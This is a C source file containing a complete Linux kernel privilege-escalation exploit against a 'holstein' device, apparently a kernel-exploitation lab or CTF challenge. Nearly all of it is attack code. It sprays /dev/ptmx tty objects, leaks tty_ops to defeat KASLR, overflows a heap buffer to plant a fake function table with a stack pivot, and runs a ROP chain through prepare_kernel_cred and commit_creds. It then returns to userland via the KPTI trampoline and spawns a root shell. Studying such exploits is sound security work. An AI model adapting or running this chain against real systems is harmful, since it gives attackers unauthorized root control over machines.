#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>



#define pop_rdi_ret (kbase + 0x0d748d) 
//#define rop_iretq (kbase + 0x022dff) // found using: objdump -d vmlinux | grep iretq
#define pop_rcx_ret (kbase + 0x13c1c4)
#define mov_rdi_rax_rep (kbase + 0x62707b) // mov rdi, rax and then mov qword [rdi], [rsi] rcx times. (put 0 in rcx to cancel ;-))
#define find_task_by_vpid (kbase + 0x06f030) // cat proc/kallsyms | grep find_task_by
#define prepare_kernel_cred (kbase + 0x074650)
#define commit_creds (kbase + 0x0744b0)
#define rop_kpti_trampoline (kbase + 0x800e26) // Use cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode, find pop rax, pop rdi, swapgs
#define push_rdx_pop_rsp_pop_r13_pop_rbp_ret (kbase + 0x1077fc) // push rdx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret. Used to set rsp

unsigned long kbase;
int global_fd;
unsigned long g_buf;
void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void open_dev(char *name){
  char devname[100] = "/dev/";
  strcat(devname, name);
  global_fd = open(devname, O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
    puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long shell_addr = (unsigned long)get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, shell_addr;"
        "push rax;"
        "ret;"
        ".att_syntax;"
    );
}

unsigned long user_rip = (unsigned long)my_jump;

void leak(){
    
}


void overflow() {
    /*
    char buf[0x500];
    memset(buf, 'A', 0x408);
    unsigned long *chain = (unsigned long)&buf[0x408];
    write(global_fd, buf, (void*)chain - (void*)buf); // since chain has been incremeneted
    */

}


int main() {
    int spray[100];

    printf("[*] Save state\n");
    save_state();

    printf("[*] Spraying first 50 tty\n");
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1) {
            fatal("/dev/ptmx");
        }
    }

    printf("[*] Open dev\n");
    open_dev("holstein");

    printf("[*] Spraying last 50 tty\n");
    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1) {
            fatal("/dev/ptmx");
        }
    }

    // LEAKING
    printf("[*] Leak\n");
    char buf[0x500];
    read(global_fd, buf, 0x500);

    unsigned long leak_tty_ops = *(unsigned long*)&buf[0x418];
    printf("[*] leak tty_ops: 0x%lx\n", leak_tty_ops);
    kbase = leak_tty_ops - 0xc38880;
    printf("[*] Kbase: 0x%lx\n", kbase);
    
    // Address of g_buf ( our chunk on the heap )
    g_buf = *(unsigned long*)&buf[0x438] - 0x438; 
    printf("[*] g_buf: 0x%lx\n", g_buf);

    // OVERFLOWING
    printf("[*] Overflow\n");
    // Write the fake function table
    unsigned long *p = (unsigned long*)&buf[0x400];
    p[12] = push_rdx_pop_rsp_pop_r13_pop_rbp_ret;
    printf("[*] Pop rdi ret: 0x%lx\n", pop_rdi_ret);
    /*
    for (int i = 0; i < 0x40; i++) {
        *p++ = 0xffffffffdede0000 + (i << 8); // i << 8 shifting 8 bits meaning 256, 512, 768 ...
        // For now it has been index 4 or 12, but to make it more reliable, we will write the desired
        // address to the first 20 indexes of p. Remember, that since p is the beginning of &buf it will be
        // written from the start of g_buf when we use the write ioctl.
        - We cannot just write to the first 0x40 of *p since it will mess up with the 2nd argument given to
        ioct(spray[i], 1st, 2nd); and we need 2nd to control rdx and then take control of rsp using our
        push rdx, pop rsp ...
    }
    */

    /*
    for (int i = 0x100; i < 0x200; i++) {
        *(unsigned long*)&buf[i] = 0xcafebabe;
    }
    */
    *(unsigned long*)&buf[0x418] = g_buf + 0x400;
    puts("[*] Write");

    // Bring rsp to heap since it has to pop rop chain
    unsigned long *chain = (unsigned long*)&buf;
    *chain++ = pop_rdi_ret; 
    *chain++ = 0x1; // pid of init, running with root privileges
    *chain++ = find_task_by_vpid;
    *chain++ = pop_rcx_ret;
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = mov_rdi_rax_rep; // put result of find_task_by_vpid into rdi
    *chain++ = prepare_kernel_cred; // return to prepare_kernel_cred
    *chain++ = pop_rcx_ret;
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = mov_rdi_rax_rep; // put result of prepare_kernel_cred into rdi
    *chain++ = commit_creds; // return to commit_creds
    *chain++ = rop_kpti_trampoline; 
    *chain++ = 0xdeadbeef; // rax
    *chain++ = 0xdeadbeef; // rdi
    *chain++ = (unsigned long)&my_jump; // rip. Use myjump function to align stack before calling system
    *chain++ = user_cs; // cs
    *chain++ = user_rflags; // rpflags
    *chain++ = user_sp; // rsp
    *chain++ = user_ss; // ss

    write(global_fd, buf, 0x500);


    // Control RIP - chrashing on 0xffffffffdede0c00, offset 0xc00 = 3072/256 = 12th
    for (int i = 0; i < 100; i++) {
        ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); // TODO: Figure out how ioctl works and look at heap with gdb
    }


    close(global_fd);
    puts("[!] end of main");

    return 0;
  }
